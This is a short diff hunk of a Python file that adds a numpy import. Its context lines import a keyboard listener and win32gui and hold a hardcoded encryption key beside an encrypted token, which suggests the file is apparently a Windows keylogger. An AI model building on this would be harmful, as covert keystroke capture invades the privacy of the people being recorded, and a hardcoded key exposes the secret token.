@@ -38,6 +38,7 @@ from pynput.keyboard import Key, Listener
 import asyncio
 import win32gui
 import logging
+import numpy as np
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
 encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
